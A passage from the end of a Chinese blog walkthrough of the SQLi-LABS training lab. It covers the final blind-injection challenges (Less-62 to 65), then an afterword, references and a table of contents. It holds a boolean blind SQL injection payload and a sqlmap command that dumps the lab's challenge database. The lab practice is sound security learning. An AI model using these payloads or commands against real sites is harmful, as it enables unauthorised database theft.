class="line">?id=1&#x27;) and ascii(substr((select secret_8J6V from 6V6AG5ZFIE limit 0,1),1,1))&gt;78--+</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQLMap-工具注入-10">SQLMap 工具注入</h4><ul><li><p>这种时候还是得让工具出马，由于限制了次数，因此需要指定盲注，防止工具浪费机会，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://[靶机地址]/Less-62/?id=1 -D challenges --dump --batch --technique B</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-63">Less-63</h3><div class="note default flat"><p>GET - challenge - Blind - 130 queries allowed - Variation 2</p></div><p>又到了换色号时间。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa209e7.webp" alt="" style="zoom:75%"><ul><li>本题与前一关基本一致，就是闭合符号变成了单引号，修改 <kbd>payload</kbd> 即可，当然工具注入的话只需修改到本题地址就行了，此处不再赘述。</li></ul><h3 id="Less-64">Less-64</h3><div class="note default flat"><p>GET - challenge - Blind - 130 queries allowed - Variation 3</p></div><p>换个色号继续来。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa8c9b3.webp" alt="" style="zoom:75%"><ul><li>本题依旧与此前关卡基本一致，但是闭合符号变成了两个小括号，其余均未作修改，故此处不再赘述。</li></ul><h3 id="Less-65">Less-65</h3><div class="note default flat"><p>GET - challenge - Blind - 130 queries allowed - Variation 4</p></div><p>万万没想到竟然已经最后一题了。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa97073.webp" alt="" style="zoom:75%"><ul><li>本题当然还是与此前关卡基本一致，就是闭合符号变成了双引号加一个小括号，其余均未作修改，故此处不再赘述。</li></ul><h2 id="后记-4">后记</h2><p>  本篇博客工期长得恐怖，中途一度烂尾，但是实际上集中做了几天貌似并不用花太久时间，<psw>所以我到底在干嘛</psw>。所幸最终还是完成了，顺带产出的还有一个 <a target="_blank" rel="noopener" href="https://github.com/h-t-m/sqli-labs-php8.1">小项目</a>，也许也称不上项目。正如正文所言，笔者使用的环境为 PHP 8.1 的环境，与旧版靶机存在很大出入，所以也进行了一定程度的修改。毕竟还是为了刷完靶机，也就顺便对修改作了一遍完整的校验，对新特性适配的同时也对前辈修改的遗漏之处做了补充。修改版还是在 GitHub 存一份，实在舍不得直接删掉。</p><p>  用写博客来督促自己刷题，结果就是笔者竟然写了一篇四万字的博客。总体来说 SQLi-LABS 并不算特别困难，毕竟很大一部分题目都是冗余的，但循序渐进的过程还是很适合小白入门的（<psw>也就是我</psw>）。笔者做完之后还是受益匪浅呀，一开始连 <kbd>union</kbd> 都玩不明白，现在都能直接手写好多 <kbd>payload</kbd> 了，顺带上对环境的研究，现在笔者设备上常驻各版本的 PHP 以及 MySQL。此外，因为一开始执着于配图，所以甚至 PS 技术也同步提高了（误）。</p><p>  本篇博客还是以手工注入为主，仅涉及了部分工具基础用法，虽说用工具是没有灵魂的，但是盲注直接交给 SQLMap 还是很爽的。</p><p>  有意思的是，笔者完成之后才知道有一份十分完善的 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/category/846064.html">MySQL 注入天书</a>，然而欣赏过后才发现，其实哪里都是这份文档，笔者参考过的大部分文章均参考于此，不得不说有这么一份完善的文档真的可以帮助很多新人越过最难的一道坎，这也许也是开源世界最大的意义吧，让后人永远能站在前人的肩膀上。希望这篇日志式的刷题记录，也能够在某个时间某个角落拯救一个新人。</p><h2 id="参考链接-3">参考链接</h2><div><ol><li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/index.php">PHP 手册</a><text style="font-size:75%">- Manual，2022-06-30</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/sycamorelg/article/details/119534400">web渗透测试----26、SQL注入漏洞--（1）原理篇</a><text style="font-size:75%">- 七天啊，2022-05-30</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46634468/article/details/120480080">SQL注入原理及如何判断闭合符</a><text style="font-size:75%">- 大大大蜜蜂，2021-09-30</text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huhuf6/p/13700448.html">SELECT 1,2,3...的含义及其在SQL注入中的用法</a><text style="font-size:75%">- huhuf6，2020-09-20</text></li><li><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/o75N6xeP5W/">MySQL中concat()、concat_ws()、group_concat()函数的使用技巧与心得总结</a><text style="font-size:75%">- 极客小俊GeekerJun，2020-09-21</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/BetsyMyGirl/article/details/121635395">sql注入系列Sqli-labs(less-1)</a><text style="font-size:75%">- m0d1fy，2021-11-30</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/115215163">sqlmap使用手册</a><text style="font-size:75%">- 山山而川，2022-02-25</text></li><li><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/">MySQL 5.7 参考手册</a><text style="font-size:75%"></text></li><li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/398726175">SQL字符型注入(get)-利用updatexml函数-报错注入</a><text style="font-size:75%">- 身高两米不到，2021-08-12</text></li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a><text style="font-size:75%">- N0r4h，2020-04-29</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Smallc0de/article/details/111552824">Mysql深度讲解 – 派生表</a><text style="font-size:75%">- Smallc0de，2020-12-22</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_60339103/article/details/125890455">sql注入-5floor报错注入</a><text style="font-size:75%">- 技术骨干小李，2022-07-20</text></li><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1665243">sqli-labs练习（第五、六关）</a><text style="font-size:75%">- 宸寰客，2020-07-21</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43901998/article/details/105253159">Less-7(文件读写操作)</a><text style="font-size:75%">- 老司机开代码，2020-08-03</text></li><li><a target="_blank" rel="noopener" href="https://flora.gitbooks.io/web-application-security/content/">网络应用安全</a><text style="font-size:75%">- GitBook</text></li><li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs 靶场精简学习记录</a><text style="font-size:75%">- 国光，2020-05-13</text></li><li><a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mariadb/server-system-variables/#secure_file_priv">MariaDB 官方文档 —— secure_file_priv</a><text style="font-size:75%"></text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/newones/p/12841318.html">get_magic_quotes_gpc 检测是否开启转义函数，5.4版移除后该怎么办？</a><text style="font-size:75%">- hello_HON，2020-05-07</text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cscshi/p/15705038.html">宽字节注入深度讲解</a><text style="font-size:75%">- 锦瑟，无端，2021-12-18</text></li><li><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK 编码表</a><text style="font-size:75%">- 千千秀字</text></li><li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/98096">Dnslog在SQL注入中的实战</a><text style="font-size:75%">- 奇安信威胁情报中心，2018-02-09</text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/category/846064.html">MySQL 注入天书</a><text style="font-size:75%">- lcamry，2016-08-11</text></li></ol></div></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>SQLi-LABS-完整训练</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://h-t-m.top/posts/8a881eff/">https://h-t-m.top/posts/8a881eff/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>h-t-m</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-10-24</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2023-01-02</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/SQL-%E6%B3%A8%E5%85%A5/">SQL 注入</a></div><div class="post_share"><div class="social-share" data-image="https://pic.h-t-m.ltd/img/SQLi-LABS.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/72821c8/"><img class="prev-cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF 刷题笔记——PWN 2</div></div></a></div><div class="next-post pull-right"><a href="/posts/aea4d4bd/"><img class="next-cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF 刷题笔记——Crypto 1</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/a080afff/" title="BUUCTF 刷题笔记——Basic 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-03</div><div class="title">BUUCTF 刷题笔记——Basic 2</div></div></a></div><div><a href="/posts/3989fe45/" title="BUUCTF 刷题笔记——Basic 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">BUUCTF 刷题笔记——Basic 1</div></div></a></div><div><a href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-23</div><div class="title">BUUCTF 刷题笔记——Crypto 1</div></div></a></div><div><a href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-21</div><div class="title">BUUCTF 刷题笔记——Misc 1</div></div></a></div><div><a href="/posts/9e217072/" title="BUUCTF 刷题笔记——PWN 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-22</div><div class="title">BUUCTF 刷题笔记——PWN 1</div></div></a></div><div><a href="/posts/3ee43a5c/" title="BUUCTF 刷题笔记——Web 0"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-27</div><div class="title">BUUCTF 刷题笔记——Web 0</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/logo.jpg" onerror='this.onerror=null,this.src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="author-info__name">h-t-m</div><div class="author-info__description">个人博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">58</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h-t-m"><i class="fab fa-github"></i><span>找我玩~</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h-t-m/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1547563662@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/b3beff564d51a.png" target="_blank" title="微信"><i class="fab fa-weixin"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/eaa1e2110d4a7.png" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客整体升级改造中</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">SQLi-LABS-完整训练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-3"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">问题汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98%EF%BC%88PHP%EF%BC%89"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">权限问题（PHP）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">错误处理问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E8%A1%A8%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">空表处理问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E6%AE%8B%E7%95%99%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">更新残留问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98%EF%BC%88MySQL%EF%BC%89"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">权限问题（MySQL）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MariaDB-%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.6.</span> <span class="toc-text">MariaDB 问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.7.</span> <span class="toc-text">MySQL 版本问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.8.</span> <span class="toc-text">Apache 版本问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%98"><span class="toc-number">1.2.</span> <span class="toc-text">基础挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">Less-2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">Less-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-3"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-3"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">1.2.4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">1.2.5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">1.2.6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">1.2.7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">1.2.8.</span> <span class="toc-text">Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-4"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-4"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">1.2.9.</span> <span class="toc-text">Less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-5"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-5"><span class="toc-number">1.2.9.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">1.2.10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.2.11.</span> <span class="toc-text">Less-11</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-6"><span class="toc-number">1.2.11.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-6"><span class="toc-number">1.2.11.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">1.2.12.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">1.2.13.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">1.2.14.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">1.2.15.</span> <span class="toc-text">Less-15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-7"><span class="toc-number">1.2.15.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-7"><span class="toc-number">1.2.15.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">1.2.16.</span> <span class="toc-text">Less-16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">1.2.17.</span> <span class="toc-text">Less-17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">1.2.18.</span> <span class="toc-text">Less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-8"><span class="toc-number">1.2.18.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-8"><span class="toc-number">1.2.18.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">1.2.19.</span> <span class="toc-text">Less-19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">1.2.20.</span> <span class="toc-text">Less-20</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">高级注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.3.1.</span> <span class="toc-text">Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-9"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-9"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">1.3.2.</span> <span class="toc-text">Less-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">1.3.3.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-24"><span class="toc-number">1.3.4.</span> <span class="toc-text">Less-24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25"><span class="toc-number">1.3.5.</span> <span class="toc-text">Less-25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25a"><span class="toc-number">1.3.6.</span> <span class="toc-text">Less-25a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26"><span class="toc-number">1.3.7.</span> <span class="toc-text">Less-26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-26a"><span class="toc-number">1.3.8.</span> <span class="toc-text">Less-26a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27"><span class="toc-number">1.3.9.</span> <span class="toc-text">Less-27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-27a"><span class="toc-number">1.3.10.</span> <span class="toc-text">Less-27a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28"><span class="toc-number">1.3.11.</span> <span class="toc-text">Less-28</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-28a"><span class="toc-number">1.3.12.</span> <span class="toc-text">Less-28a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-29"><span class="toc-number">1.3.13.</span> <span class="toc-text">Less-29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-30"><span class="toc-number">1.3.14.</span> <span class="toc-text">Less-30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-31"><span class="toc-number">1.3.15.</span> <span class="toc-text">Less-31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-32"><span class="toc-number">1.3.16.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-33"><span class="toc-number">1.3.17.</span> <span class="toc-text">Less-33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-34"><span class="toc-number">1.3.18.</span> <span class="toc-text">Less-34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-35"><span class="toc-number">1.3.19.</span> <span class="toc-text">Less-35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-36"><span class="toc-number">1.3.20.</span> <span class="toc-text">Less-36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-37"><span class="toc-number">1.3.21.</span> <span class="toc-text">Less-37</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38"><span class="toc-number">1.4.1.</span> <span class="toc-text">Less-38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-39"><span class="toc-number">1.4.2.</span> <span class="toc-text">Less-39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-40"><span class="toc-number">1.4.3.</span> <span class="toc-text">Less-40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-41"><span class="toc-number">1.4.4.</span> <span class="toc-text">Less-41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-42"><span class="toc-number">1.4.5.</span> <span class="toc-text">Less-42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-43"><span class="toc-number">1.4.6.</span> <span class="toc-text">Less-43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-44"><span class="toc-number">1.4.7.</span> <span class="toc-text">Less-44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-45"><span class="toc-number">1.4.8.</span> <span class="toc-text">Less-45</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-46"><span class="toc-number">1.4.9.</span> <span class="toc-text">Less-46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-47"><span class="toc-number">1.4.10.</span> <span class="toc-text">Less-47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-48"><span class="toc-number">1.4.11.</span> <span class="toc-text">Less-48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-49"><span class="toc-number">1.4.12.</span> <span class="toc-text">Less-49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-50"><span class="toc-number">1.4.13.</span> <span class="toc-text">Less-50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-51"><span class="toc-number">1.4.14.</span> <span class="toc-text">Less-51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-52"><span class="toc-number">1.4.15.</span> <span class="toc-text">Less-52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-53"><span class="toc-number">1.4.16.</span> <span class="toc-text">Less-53</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E6%8C%91%E6%88%98"><span class="toc-number">1.5.</span> <span class="toc-text">进阶挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-54"><span class="toc-number">1.5.1.</span> <span class="toc-text">Less-54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-55"><span class="toc-number">1.5.2.</span> <span class="toc-text">Less-55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-56"><span class="toc-number">1.5.3.</span> <span class="toc-text">Less-56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-57"><span class="toc-number">1.5.4.</span> <span class="toc-text">Less-57</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-58"><span class="toc-number">1.5.5.</span> <span class="toc-text">Less-58</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-59"><span class="toc-number">1.5.6.</span> <span class="toc-text">Less-59</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-60"><span 